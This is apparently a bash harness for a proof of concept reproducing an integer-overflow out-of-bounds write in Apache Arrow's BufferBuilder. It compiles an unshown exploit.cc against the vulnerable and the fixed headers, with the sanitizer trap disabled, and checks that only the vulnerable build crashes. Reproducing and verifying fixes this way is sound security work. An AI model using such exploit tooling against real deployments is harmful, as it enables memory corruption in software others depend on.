#!/usr/bin/env bash
# ArrowWrap PoC — reproduces the Apache Arrow BufferBuilder integer-overflow
# out-of-bounds write (GH-49884 / commit 16900e3), differentially against the
# real vulnerable header (apache-arrow-26.0.1) and the real fixed header.
set -u

ZIG=/home/millie/tools/toolchain/zig-linux-x86_64-0.14.0/zig
HERE="$(cd "$(dirname "$0")" && pwd)"

echo "=== [build] vulnerable (apache-arrow-26.0.1 buffer_builder.h) ==="
# -fno-sanitize=undefined disables zig's default UBSan signed-overflow trap so
# the overflow wraps (as on x86) and the resulting out-of-bounds write is
# exercised, rather than the trap firing first at the arithmetic line.
"$ZIG" c++ -O0 -std=c++17 -fno-strict-aliasing -fno-sanitize=undefined \
    -I "$HERE/vuln" -I "$HERE/support" \
    "$HERE/exploit.cc" -o "$HERE/vuln_bin" 2>&1 | sed 's/^/  /'
echo "  -> $HERE/vuln_bin"

echo
echo "=== [build] fixed (commit 16900e3 buffer_builder.h) ==="
"$ZIG" c++ -O0 -std=c++17 -fno-strict-aliasing -fno-sanitize=undefined \
    -I "$HERE/fixed" -I "$HERE/support" \
    "$HERE/exploit.cc" -o "$HERE/fixed_bin" 2>&1 | sed 's/^/  /'
echo "  -> $HERE/fixed_bin"

echo
echo "=== [run] vulnerable build ==="
set +e
"$HERE/vuln_bin"
VULN_RC=$?
set -e
echo "[vulnerable build exit code: $VULN_RC]"

echo
echo "=== [run] fixed build ==="
set +e
"$HERE/fixed_bin"
FIXED_RC=$?
set -e
echo "[fixed build exit code: $FIXED_RC]"

echo
echo "=== [summary] ==="
if [ "$VULN_RC" -ne 0 ]; then
  echo "VULN: crashed with exit $VULN_RC (SIGSEGV = out-of-bounds write) after OVERFLOW-CONFIRMED"
else
  echo "VULN: did not crash"
fi
if [ "$FIXED_RC" -eq 0 ]; then
  echo "FIXED: rejected the overflow cleanly (CapacityError), no crash"
else
  echo "FIXED: exit $FIXED_RC"
fi

if [ "$VULN_RC" -ne 0 ] && [ "$FIXED_RC" -eq 0 ]; then
  echo "RESULT: PASS — vulnerable build performs an out-of-bounds write and crashes; fixed build rejects it."
  exit 0
fi
echo "RESULT: FAIL"
exit 1
